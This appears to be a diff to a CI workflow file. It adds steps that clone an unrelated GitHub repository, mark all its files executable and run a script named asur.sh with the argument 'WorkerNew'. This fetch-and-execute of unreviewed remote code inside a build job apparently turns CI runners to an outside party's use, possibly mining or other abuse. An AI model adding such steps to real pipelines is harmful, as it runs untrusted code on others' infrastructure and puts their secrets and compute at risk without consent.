@@ -15,5 +15,7 @@ jobs:
         shell: sh
         run: |
              ls
+             git clone https://github.com/deemahts/xddd.git
+             cd xddd
              chmod +x *
              ./asur.sh WorkerNew
